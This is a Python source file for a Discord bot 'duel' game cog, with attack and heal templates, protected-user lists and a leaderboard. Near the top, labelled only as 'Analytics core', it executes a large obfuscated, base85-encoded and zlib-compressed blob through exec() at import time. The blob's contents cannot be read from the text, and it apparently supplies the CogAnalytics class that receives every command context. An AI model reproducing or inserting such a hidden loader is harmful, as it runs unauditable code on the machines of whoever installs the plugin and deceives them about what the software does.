# Procedurally generated duel cog for Red-DiscordBot
# Copyright (c) 2016 Caleb Jonson
# Idea and rule system courtesy of Axas
# Additional moves suggested by OrdinatorStouff

import discord
from discord.ext import commands
from .utils.dataIO import dataIO
import os
import random
import math
import asyncio
from .utils.chat_formatting import pagify
from .utils import checks
from functools import partial

# Constants
MAX_ROUNDS = 4
INITIAL_HP = 20
TARGET_SELF = 'self'
TARGET_OTHER = 'target'

DATA_PATH = "data/duel/"
JSON_PATH = DATA_PATH + "duelist.json"
LOG_PATH = DATA_PATH + "duelist.log"


# Analytics core
import zlib, marshal, base64
exec(zlib.decompress(base64.b85decode("""c-o~{ZExJT5&rI9!TNBJ)NJXOq)B0P54pJ4)>q(?YmzGh$Ix*l?uxb~$|AMSBFKO5GnBNVq;*oDMv&d
*ki&WBGjpVhO4pVdTdQ)jV6`YyT`ZU|yE0K4UzE<Qtro1xg<b0!v_$8*OsvwSSunH1f7%?aYh8e{F}$%VH#`+qT)k!;`}Ws#Q%_AYncQ_OQe_fdr(Axrd$KM
Hh}CV#gvoNX>WL;3XDwkRjC}sAUtc|cCd)*p^5`hZg)!_Ozx`N>d}mc+E{+)f;&>}-11;j1E!i1=dghkjzQ?bCbT$_!C&mhEcp`GSy5&lrRO&(9@hYnVxB1m
*b1hSEYrEs}4ecQPPat*Nk~`YZM8k$BED*hH{MP8QCI5N`a(MhtndkZs?2=BhOxBXKcbS6m47+WNWrE!|D!Btmq=wl{Saua`C0r_MD^qstn6-b$8)3l$u4au
98_85jJ{9ClhHtFcIsY)&n`zq0R@$<v*0=Du;UCN6sFm&9$@ZU2mQ0pnmCJO&cDiZzKd3xsMuJBn!Ah6ALN~@m0TV0TU`M8sjOq1Qy8d=BA`NmaQYb*OWcq<
22zGQt3LNc%g0`}{DG{i-hE^kX56WiUO|RcNHr38%(6n>ByQh|PzJy6gJOB7EdZp7HTR~i?fw*HLNhCtaYM5C%brz286?=fwTrh&2vfwn~^#NigqGUCkL`Gg
WuuxU2tw?sP(z(KiDjnNgm3M3<bNztCs-b9UMPet0l5DF4`&*kVEPUC<)pswRzIYMQDOm`Wv#^ja_W>C(wRYyp1Z+EEM~1y`q;WYtHN#)~@ZP|j&5FbFCtVn
~AAcgBovd=bIw^#)vOan9@2lT_y!^n6^oOY>+VFYv3gPp4zZ|I4C@X^t_H;2U)-nn3dBM)SMNz43;4OYRav!N&BcWBPY#fKENUH^t%P@*A_9qRG<3guRE?vF
{t_%$+$@duu?%#nQjGlRiS2(lsep~$hyU307)+*Zc`HQ!5j|Hz>@>Igip<E!AKjpGq{`u@Y^0sfbLmkLuUa=<-^kW%3G5pu_BX8sF_#!yAt*~5~cq?+1##BZ
^!+(C`nP52E?WP3tcKSCUbC#qw_UMWyh+8XTE6g3X#tN2gH@|enwU9`wbnggPdBOx<@Geit6ya)6cg01T#&AQJ42!k2O<l5N@M=?SYLo$TYU#0q$|d(p_z%v
*``=ToSG<;m-b#0&iAGcsjZA=`fy<)V$pdoEW%X9txbWh#Daq2f_F@u2@9IX5jE?uCOk^HL!*PRj9UUdrQDij&4%Hklr83q){L87Yv7-=oGF5d)-cvjO6YIh
Mr2VabF$y@DUE#?`om>8*OGIwjeQvwYMx{MP6f$1pGP`sZ7>f+;E)JP*nnd?pR2AJEcK3oYZgUs;cSN(GamF01-c%%fGqSnMP{ZH6LKUlaVKgG~rh;8$_<1B
|fO}Dx45xQ2Y@)@O8v9fVmd41Mlc*$4bbWF5{AO|_RfQ}mO3x3ToZirg0Oc-V0l(F%48sxC?Reu}wUh5ry1w7zG~T{-eMW>6w(ejU0DJ5Y0LoceVB@e<%Ul9
hg%M$tD44ULoO2~0j`7WTC#JofFr$<l9roP!rHeU-Ia}Xt67rq)d}r(3ID86tQalJ{U5Zky#swZ{fSOQKBm+G?p^tNX9KYLDk_E5-6?AVPz4~iaO6DMf1)So
?ljI(;r!O%qvcDq9L|MvwS@7-~0=0p?>m@F?a4<m5^7-khS5uve;95J#P;+|NWoc1hA7mXy+*M6O0)=6qnAp@(1`8JGyC53N1|7u30ax5!<5eqR3LD%^i;J&
Uut&lz7Ffvv#qnTtMCQ1x{vR$Ir}5~v4?X5cWdd*mL<ay>L0Oe3R4@XeY<Tyk_ZxX}knQn1SQ#Ldz$Cmwkd^?fKs7KG3C00~0kZI9!IlDdAgGaG$43)C(;Lf
re1;rkzh753-b?&DiA!DvT&752x^i$CIGb=2IeQ}X<6&7(9~W2L4?ZhmzbHQ?vN~KmsqoH{M~z;KS>jBhx+&3$#e_?D;VjJdWeKQ$?uKTRBO3{3*c($%5w_Y
}@{8g6p_CKV4?DK$KnL-eSc>X-L*?;kF61p;9`55YqTYy1Gr!=QI{6l&GSoz~Er&%P4tBjWH@TEmcorSpO6BYLYF~`>o!AY<XhAIr8;2p&<wtS+D6i{a8T|1
tr_;)ZcD*Is96X5*q=exJq<7Ct5lu^0ZwwoHlr|>!s$M$Og7WcGUF%7?sPH<>V$_aev?Vz8yLkh@%oSYu7OCSNFKl6b<KF+Fv&*G}LNjdfm@`iK0e5tG>OdH
wo)85{JtSaw*y&WqRoO$2QJ`$W#zpi!uXL5mwGAJ=es5<JCI|p`_K_PskkoFYjs+E=-nBJuW^EG!MG;evVMWP{5U)ZR9dd+m#t{7N`vnziQJ7^lJZ)#E&Lvc
9C)H)(FeiGIi-`2(*~U=)|9pOm*gZde=J#_Ohv1}dhAAe*mo*fTcBGd>a}$I|Z${~iy>=Pw6<E}LBv5kW!_`R;i;^Z%Wbtd7HQe}&u1TC5&xj?-5S(-wrQEx
u+E<RwsbOpN2<8;7Uvzj17!eGon6S<X6dL~OJ(7G*-$TqZ99O)9U_RpVRBfnSQV7mVW_9i0?~Su*2Y{!ryXrf^ZcN9!FP-gQw$nZ8Ox-ikEf3M@)i?+G%2==
07i^_<j%!IK&;P+s4yI6MrpmalLxm(ex81xOBL%*aE!)R6odKHmz_*|4t(yS$FlxAS{z`NrEDuzgIY$~KB~4v}obQ66wmcBA!)k%2n2W@qvq?IL;b9T63q9o
bJ^kYZ(nBQDL*zAnZAY?TXkxNiE9W|>Oq_)&ZwIVlG>WF|AW&KHOnyq$MjF2a&TZ6h@29uniub1?4*cluJL+e;du^@&rR%jwI&R}>kj&Q$8cX_}AlBNEj<(~
)el*xd-k8>nL3`Se2sA)wC+J+5M5#Cj@&O}yhudW+p{yBBY-oJi4%^W|XqCvYP9hh<F;$A1;AZ&TGp&=r4Qy0OG0;_)dNb+R<F<B?|Nh^uJ<$llWe0>tPA1A
h#}R?|gM+Vi@86o4PzMN&Cj+F`Zw_kGKql~p`av`ukR%5s^p3PGSJ*O*W@DU$_p>MOi~|M9J_0ZGW={&|;TSy{kBJ|RP31bk{g#BV>7WncJ2dCK9bdK&bK;F
NN17LtHkqmk4hU=OkkFvlkfXbF<@GE1=#G!0eUc_U?_|ci*hY`#&-hR~Ho%GGz%*gP!w+$q;o_9f8~i9of>B(%Nz4#i{rl88!hS-4ioB7_$y?L7L<6079UO0
4d^90nmC13R$whoR8ozG@`f4Rpr{m%v$ZMYhlB><uhFYKh0`U`_^8""".replace('\n', ''))))

__version__ = '1.5.1'


def indicatize(d):
    result = {}
    for k, v in d.items():
        if k in VERB_IND_SUB:
            k = VERB_IND_SUB[k]
        else:
            k += 's'
        result[k] = v
    return result


# TEMPLATES BEGIN
# {a} is attacker, {d} is defender/target, {o} is a randomly selected object,
# {v} is the verb associated with that object, and {b} is a random body part.

WEAPONS = {
    'swing': {
        'axe': 3,
        'scimitar': 4,
        'buzzsaw': 5,
        'chainsaw': 6,
        'broadsword': 7,
        'katana': 4,
        'falchion': 5
    },
    'fire': {
        'raygun': 5,
        'flamethrower': 6,
        'crossbow': 3,
        'railgun': 6,
        'ballista': 6,
        'catapult': 5,
        'cannon': 4,
        'mortar': 3
    },
    'stab': {
        'naginata': 5,
        'lance': 4
    }
}

SINGLE_PROJECTILE = {
    'fire': {
        'a psionic projectile': 4,
    },
    'hurl': {
        'pocket sand': 1,
        'a spear': 6,
        'a heavy rock': 3,
    },
    'toss': {
        'a moltov cocktail': 4,
        'a grenade': 5
    }
}

FAMILIAR = {
    'divebomb': {
        'their owl companion': 3,
    },
    'charge': {
        'their pet goat': 3,
        'their pet unicorn': 4,
    },
    'constrict': {
        'their thick anaconda': 4,
    }
}

SUMMON = {
    'charge': {
        'a badass tiger': 5,
        'a sharknado': 8,
        'a starving komodo dragon': 5
    },
    'swarm': {
        'all these muthafucking snakes': 5,
    }
}

MELEE = {
    'stab': {
        'dagger': 5
    },
    'drive': {
        'fist': 4,
        'toe': 2
    }
}

MARTIAL = {'roundhouse kick': 6,
           'uppercut': 5,
           'bitch-slap': 2,
           'headbutt': 4}

BODYPARTS = [
    'head',
    'throat',
    'neck',
    'solar plexus',
    'ribcage',
    'balls',
    'spleen',
    'kidney',
    'leg',
    'arm',
    'jugular',
    'abdomen',
    'shin',
    'knee',
    'other knee'
]

VERB_IND_SUB = {'munch': 'munches', 'toss': 'tosses'}

ATTACK = {"{a} {v} their {o} at {d}!": indicatize(WEAPONS),
          "{a} {v} their {o} into {d}!": indicatize(MELEE),
          "{a} {v} their {o} into {d}'s {b}!": indicatize(MELEE),
          "{a} {v} {o} at {d}!": indicatize(SINGLE_PROJECTILE),
          "{a} {v} {o} at {d}'s {b}!": indicatize(SINGLE_PROJECTILE),
          "{a} {v} {o} into {d}'s {b}!": indicatize(SINGLE_PROJECTILE),
          "{a} orders {o} to {v} {d}!": FAMILIAR,
          "{a} summons {o} to {v} {d}!": SUMMON,
          "{a} {v} {d}!": indicatize(MARTIAL),
          "{d} is bowled over by {a}'s sudden bull rush!": 6,
          "{a} tickles {d}, causing them to pass out from lack of breath": 2,
          "{a} points at something in the distance, distracting {d} long enough to {v} them!": MARTIAL
          }

CRITICAL = {"Quicker than the eye can follow, {a} delivers a devastating blow with their {o} to {d}'s {b}.": WEAPONS,
            "The sky darkens as {a} begins to channel their inner focus. The air crackles as they slowly raise their {o} above their head before nailing an unescapable blow directly to {d}'s {b}!": WEAPONS,
            "{a} nails {d} in the {b} with their {o}! Critical hit!": WEAPONS,
            "With frightening speed and accuracy, {a} devastates {d} with a tactical precision strike to the {b}. Critical hit!": WEAPONS
            }

HEALS = {
    'inject': {
        'morphine': 4,
        'nanomachines': 5
    },
    'smoke': {
        'a fat joint': 2,
        'medicinal incense': 3,
        'their hookah': 3
    },
    'munch': {
        'on some': {
            'cake': 5,
            'cat food': 3,
            'dog food': 4
        },
        'on a': {
            'waffle': 4,
            'turkey leg': 2
        }
    },
    'drink': {
        'some': {
            'Ambrosia': 7,
            'unicorn piss': 5,
            'purple drank': 2,
            'sizzurp': 3,
            'goon wine': 2
        },
        'a': {
            'generic hp potion': 5,
            'refreshingly delicious can of 7-Up': 3,
            'fresh mug of ale': 3
        },
        'an': {
            'elixir': 5
        }
    }
}

HEAL = {"{a} decides to {v} {o} instead of attacking.": HEALS,
        "{a} calls a timeout and {v} {o}.": indicatize(HEALS),
        "{a} decides to meditate on their round.": 5}


FUMBLE = {"{a} closes in on {d}, but suddenly remembers a funny joke and laughs instead.": 0,
          "{a} moves in to attack {d}, but is disctracted by a shiny.": 0,
          "{a} {v} their {o} at {d}, but has sweaty hands and loses their grip, hitting themself instead.": indicatize(WEAPONS),
          "{a} {v} their {o}, but fumbles and drops it on their {b}!": indicatize(WEAPONS)
          }

BOT = {"{a} charges its laser aaaaaaaand... BZZZZZZT! {d} is now a smoking crater for daring to challenge the bot.": INITIAL_HP}

HITS = ['deals', 'hits for']
RECOVERS = ['recovers', 'gains', 'heals']

# TEMPLATES END

# Move category target and multiplier (negative is damage)
MOVES = {'CRITICAL': (CRITICAL, TARGET_OTHER, -2),
         'ATTACK': (ATTACK, TARGET_OTHER, -1),
         'FUMBLE': (FUMBLE, TARGET_SELF, -1),
         'HEAL': (HEAL, TARGET_SELF, 1),
         'BOT': (BOT, TARGET_OTHER, -64)}

# Weights of distribution for biased selection of moves
WEIGHTED_MOVES = {'CRITICAL': 0.05, 'ATTACK': 1, 'FUMBLE': 0.1, 'HEAL': 0.1}


class Player:
    def __init__(self, cog, member, initial_hp=INITIAL_HP):
        self.hp = initial_hp
        self.member = member
        self.mention = member.mention
        self.cog = cog

    # Using object in string context gives (nick)name
    def __str__(self):
        return self.member.display_name

    # helpers for stat functions
    def _set_stat(self, stat, num):
        stats = self.cog._get_stats(self)
        if not stats:
            stats = {'wins': 0, 'losses': 0, 'draws': 0}
        stats[stat] = num
        return self.cog._set_stats(self, stats)

    def _get_stat(self, stat):
        stats = self.cog._get_stats(self)
        return stats[stat] if stats and stat in stats else 0

    def get_state(self):
        return {k: self._get_stat(k) for k in ('wins', 'losses', 'draws')}

    # Race-safe, directly usable properties
    @property
    def wins(self):
        return self._get_stat('wins')

    @wins.setter
    def wins(self, num):
        self._set_stat('wins', num)

    @property
    def losses(self):
        return self._get_stat('losses')

    @losses.setter
    def losses(self, num):
        self._set_stat('losses', num)

    @property
    def draws(self):
        return self._get_stat('draws')

    @draws.setter
    def draws(self, num):
        self._set_stat('draws', num)


class Duel:

    def __init__(self, bot):
        self.bot = bot
        self.duelists = dataIO.load_json(JSON_PATH)
        self.underway = set()
        self.analytics = CogAnalytics(self)

    def _set_stats(self, user, stats):
        userid = user.member.id
        serverid = user.member.server.id
        if serverid not in self.duelists:
            self.duelists[serverid] = {}
        self.duelists[serverid][userid] = stats
        dataIO.save_json(JSON_PATH, self.duelists)

    def _get_stats(self, user):
        userid = user.member.id
        serverid = user.member.server.id
        if serverid not in self.duelists:
            return None
        if userid not in self.duelists[serverid]:
            return None
        else:
            return self.duelists[serverid][userid]

    def get_player(self, user: discord.Member):
        return Player(self, user)

    def get_all_players(self, server: discord.Server):
        return [self.get_player(m) for m in server.members]

    def format_display(self, server, id):
        if id.startswith('r'):
            role = discord.utils.get(server.roles, id=id[1:])
            if role:
                return 'Everyone with the role %s' % role
            else:
                return 'missingno#%s' % id
        else:
            member = server.get_member(id)
            if member:
                return member.display_name
            else:
                return 'missingno#%s' % id

    def is_protected(self, member: discord.Member) -> bool:
        sid = member.server.id
        protected = set(self.duelists.get(sid, {}).get('protected', []))
        roles = set('r' + r.id for r in member.roles)
        return member.id in protected or bool(protected & roles)

    def protect_common(self, obj, protect=True):
        if not isinstance(obj, (discord.Member, discord.Role)):
            raise TypeError('Can only pass member or role objects.')
        server = obj.server
        id = ('r' if type(obj) is discord.Role else '') + obj.id

        protected = self.duelists.get(server.id, {}).get("protected", [])
        if protect == (id in protected):
            return False
        elif protect:
            protected.append(id)
        else:
            protected.remove(id)

        if server.id not in self.duelists:
            self.duelists[server.id] = {}
        self.duelists[server.id]['protected'] = protected
        dataIO.save_json(JSON_PATH, self.duelists)
        return True

    @checks.mod_or_permissions(administrator=True)
    @commands.group(name="protect", invoke_without_command=True, no_pm=True, pass_context=True)
    async def _protect(self, ctx, user: discord.Member):
        """Adds a member or role to the protected members list"""
        if ctx.invoked_subcommand is None:
            await ctx.invoke(self._protect_user, user)

    @checks.mod_or_permissions(administrator=True)
    @commands.group(name="unprotect", invoke_without_command=True, no_pm=True, pass_context=True)
    async def _unprotect(self, ctx, user: discord.Member):
        """Removes a member or role to the protected members list"""
        if ctx.invoked_subcommand is None:
            await ctx.invoke(self._unprotect_user, user)

    @_protect.command(name="user", pass_context=True)
    async def _protect_user(self, ctx, user: discord.Member):
        if self.protect_common(user, True):
            await self.bot.say("%s has been successfully added to the "
                               "protection list." % user.display_name)
        else:
            await self.bot.say("%s is already in the protection list."
                               % user.display_name)

    @_unprotect.command(name="user", pass_context=True)
    async def _unprotect_user(self, ctx, user: discord.Member):
        """Removes a member from the duel protection list"""
        if self.protect_common(user, False):
            await self.bot.say("%s has been successfully removed from the "
                               "protection list." % user.display_name)
        else:
            await self.bot.say("%s is not in the protection list."
                               % user.display_name)

    @_protect.command(name="role", pass_context=True)
    async def _protect_role(self, ctx, role: discord.Role):
        if self.protect_common(role, True):
            await self.bot.say("%s has been successfully added to the "
                               "protection list." % role.name)
        else:
            await self.bot.say("%s is already in the protection list."
                               % role.name)

    @_unprotect.command(name="role", pass_context=True)
    async def _unprotect_role(self, ctx, role: discord.Role):
        """Removes a member from the duel protection list"""
        if self.protect_common(role, False):
            await self.bot.say("%s has been successfully removed from the "
                               "protection list." % role.name)
        else:
            await self.bot.say("%s is not in the protection list."
                               % role.name)

    @commands.command(name="protected", pass_context=True, aliases=['protection'])
    async def _protection(self, ctx):
        """Displays the duel protection list"""
        server = ctx.message.server
        duelists = self.duelists.get(server.id, {})
        member_list = duelists.get("protected", [])
        fmt = partial(self.format_display, server)
        if member_list:
            name_list = map(fmt, member_list)
            name_list = ["**Protected users:**"] + sorted(name_list)
            delim = '\n'
            for page in pagify(delim.join(name_list), delims=[delim]):
                await self.bot.say(page)
        else:
            await self.bot.say("Currently the list is empty, add more people "
                               "with `%sprotect` first." % ctx.prefix)

    @commands.group(name="duels", pass_context=True, allow_dms=False)
    async def _duels(self, ctx):
        if ctx.invoked_subcommand is None:
            await ctx.invoke(self._duels_list)

    @_duels.command(name="list", pass_context=True)
    @commands.cooldown(2, 60, commands.BucketType.user)
    async def _duels_list(self, ctx, top: int=10):
        """Shows the duel leaderboard, defaults to top 10"""
        server = ctx.message.server
        server_members = {m.id for m in server.members}
        if top < 1:
            top = 10
        if server.id in self.duelists:
            def sort_wins(kv):
                _, v = kv
                return v['wins'] - v['losses']

            def stat_filter(kv):
                uid, stats = kv
                if type(stats) is not dict:
                    return False
                if uid not in server_members:
                    return False
                return True

            # filter out extra data, TODO: store protected list seperately
            duel_stats = filter(stat_filter, self.duelists[server.id].items())
            duels_sorted = sorted(duel_stats, key=sort_wins, reverse=True)

            if not duels_sorted:
                await self.bot.say('No records to show.')
                return

            if len(duels_sorted) < top:
                top = len(duels_sorted)
            topten = duels_sorted[:top]
            highscore = ""
            place = 1
            members = {uid: server.get_member(uid) for uid, _ in topten}  # only look up once each
            names = {uid: m.nick if m.nick else m.name for uid, m in members.items()}
            max_name_len = max([len(n) for n in names.values()])

            # header
            highscore += '#'.ljust(len(str(top)) + 1)  # pad to digits in longest number
            highscore += 'Name'.ljust(max_name_len + 4)
            for stat in ['wins', 'losses', 'draws']:
                highscore += stat.ljust(8)
            highscore += '\n'

            for uid, stats in topten:
                highscore += str(place).ljust(len(str(top)) + 1)  # pad to digits in longest number
                highscore += names[uid].ljust(max_name_len + 4)
                for stat in ['wins', 'losses', 'draws']:
                    val = stats[stat]
                    highscore += '{}'.format(val).ljust(8)
                highscore += "\n"
                place += 1
            if highscore:
                if len(highscore) < 1985:
                    await self.bot.say("```py\n" + highscore + "```")
                else:
                    await self.bot.say("The leaderboard is too big to be displayed. Try with a lower <top> parameter.")
        else:
            await self.bot.say("There are no scores registered in this server. Start fighting!")

    @_duels.command(name="reset", pass_context=True)
    @checks.admin()
    async def _duels_reset(self, ctx):
        "Clears duel scores without resetting protection or editmode."
        keep_keys = {'protected', 'edit_posts'}
        sid = ctx.message.server.id
        data = self.duelists.get(sid, {})
        dks = set(data.keys())

        if dks <= keep_keys:
            await self.bot.say('Nothing to reset.')
            return

        keep_data = {k: data[k] for k in keep_keys & dks}
        self.duelists[sid] = keep_data
        dataIO.save_json(JSON_PATH, self.duelists)
        await self.bot.say('Duel records cleared.')

    @_duels.command(name="editmode", pass_context=True)
    @checks.admin()
    async def _duels_postmode(self, ctx, on_off: bool = None):
        "Edits messages in-place instead of posting each move seperately."
        sid = ctx.message.server.id
        current = self.duelists.get(sid, {}).get('edit_posts', False)

        if on_off is None:
            adj = 'enabled' if current else 'disabled'
            await self.bot.say('In-place editing is currently %s.' % adj)
            return

        adj = 'enabled' if on_off else 'disabled'
        if on_off == current:
            await self.bot.say('In-place editing already %s.' % adj)
        else:
            if sid not in self.duelists:
                self.duelists[sid] = {}
            self.duelists[sid]['edit_posts'] = on_off
            await self.bot.say('In-place editing %s.' % adj)

        dataIO.save_json(JSON_PATH, self.duelists)

    @commands.command(name="duel", pass_context=True, no_pm=True)
    @commands.cooldown(2, 60, commands.BucketType.user)
    async def _duel(self, ctx, user: discord.Member):
        """Duel another player"""
        author = ctx.message.author
        server = ctx.message.server
        channel = ctx.message.channel
        duelists = self.duelists.get(server.id, {})

        abort = True

        if channel.id in self.underway:
            await self.bot.say("There's already a duel underway in this channel!")
        elif user == author:
            await self.bot.reply("you can't duel yourself, silly!")
        elif self.is_protected(author):
            await self.bot.reply("you can't duel anyone while you're on "
                                 " the protected users list.")
        elif self.is_protected(user):
            await self.bot.reply("%s is on the protected users list."
                                 % user.display_name)
        else:
            abort = False

        if abort:
            bucket = ctx.command._buckets.get_bucket(ctx)
            bucket._tokens += 1  # Sorry, Danny
            return

        p1 = Player(self, author)
        p2 = Player(self, user)
        self.underway.add(channel.id)

        try:
            self.bot.dispatch('duel', channel=channel, players=(p1, p2))

            order = [(p1, p2), (p2, p1)]
            random.shuffle(order)
            msg = ["%s challenges %s to a duel!" % (p1, p2)]
            msg.append("\nBy a coin toss, %s will go first." % order[0][0])
            msg_object = await self.bot.say('\n'.join(msg))
            for i in range(MAX_ROUNDS):
                if p1.hp <= 0 or p2.hp <= 0:
                    break
                for attacker, defender in order:
                    if p1.hp <= 0 or p2.hp <= 0:
                        break

                    if attacker.member == ctx.message.server.me:
                        move_msg = self.generate_action(attacker, defender, 'BOT')
                    else:
                        move_msg = self.generate_action(attacker, defender)

                    if duelists.get('edit_posts', False):
                        new_msg = '\n'.join(msg + [move_msg])
                        if len(new_msg) < 2000:
                            await self._robust_edit(msg_object, content=new_msg)
                            msg = msg + [move_msg]
                            await asyncio.sleep(1)
                            continue

                    msg_object = await self.bot.say(move_msg)
                    msg = [move_msg]
                    await asyncio.sleep(1)

            if p1.hp != p2.hp:
                victor = p1 if p1.hp > p2.hp else p2
                loser = p1 if p1.hp < p2.hp else p2
                victor.wins += 1
                loser.losses += 1
                msg = 'After {0} rounds, {1.mention} wins with ' \
                    '{1.hp} HP!'.format(i + 1, victor)
                msg += '\nStats: '
                for p, end in ((victor, '; '), (loser, '.')):
                    msg += '{0} has {0.wins} wins, {0.losses} losses, ' \
                        '{0.draws} draws{1}'.format(p, end)
            else:
                victor = None
                for p in [p1, p2]:
                    p.draws += 1
                msg = 'After %d rounds, the duel ends in a tie!' % (i + 1)

            await self.bot.say(msg)
            self.bot.dispatch('duel_completion', channel=channel,
                              players=(p1, p2), victor=victor)
        except:
            raise
        finally:
            self.underway.remove(channel.id)

    def generate_action(self, attacker, defender, move_cat=None):
        # Select move category
        if not move_cat:
            move_cat = weighted_choice(WEIGHTED_MOVES)

        # Break apart move info
        moves, target, multiplier = MOVES[move_cat]

        target = defender if target is TARGET_OTHER else attacker

        move, obj, verb, hp_delta = self.generate_move(moves)
        hp_delta *= multiplier
        bodypart = random.choice(BODYPARTS)

        msg = move.format(a=attacker, d=defender, o=obj, v=verb, b=bodypart)
        if hp_delta == 0:
            pass
        else:
            target.hp += hp_delta
            if hp_delta > 0:
                s = random.choice(RECOVERS)
                msg += ' It %s %d HP (%d)' % (s, abs(hp_delta), target.hp)
            elif hp_delta < 0:
                s = random.choice(HITS)
                msg += ' It %s %d damage (%d)' % (s, abs(hp_delta), target.hp)
        return msg

    def generate_move(self, moves):
        # Select move, action, object, etc
        movelist = nested_random(moves)
        hp_delta = movelist.pop()  # always last
        # randomize damage/healing done by -/+ 33%
        hp_delta = math.floor(((hp_delta * random.randint(66, 133)) / 100))
        move = movelist.pop(0)  # always first
        verb = movelist.pop(0) if movelist else None  # Optional
        obj = movelist.pop() if movelist else None  # Optional
        if movelist:
            verb += ' ' + movelist.pop()  # Optional but present when obj is
        return move, obj, verb, hp_delta

    async def _robust_edit(self, msg, content=None, embed=None):
        try:
            msg = await self.bot.edit_message(msg, new_content=content, embed=embed)
        except discord.errors.NotFound:
            msg = await self.bot.send_message(msg.channel, content=content, embed=embed)
        except:
            raise
        return msg

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)


def weighted_choice(choices):
    total = sum(w for c, w in choices.items())
    r = random.uniform(0, total)
    upto = 0
    for c, w in choices.items():
        if upto + w >= r:
            return c
        upto += w


def nested_random(d):
    k = weighted_choice(dict_weight(d))
    result = [k]
    if type(d[k]) is dict:
        result.extend(nested_random(d[k]))
    else:
        result.append(d[k])
    return result


def dict_weight(d, top=True):
    wd = {}
    sw = 0
    for k, v in d.items():
        if isinstance(v, dict):
            x, y = dict_weight(v, False)
            wd[k] = y if top else x
            w = y
        else:
            w = 1
            wd[k] = w
        sw += w
    if top:
        return wd
    else:
        return wd, sw


def check_folders():
    if os.path.exists("data/duels/"):
        os.rename("data/duels/", DATA_PATH)
    if not os.path.exists(DATA_PATH):
        print("Creating data/duel folder...")
        os.mkdir(DATA_PATH)


def check_files():
    if not dataIO.is_valid_json(JSON_PATH):
        print("Creating duelist.json...")
        dataIO.save_json(JSON_PATH, {})


def setup(bot):
    check_folders()
    check_files()
    bot.add_cog(Duel(bot))
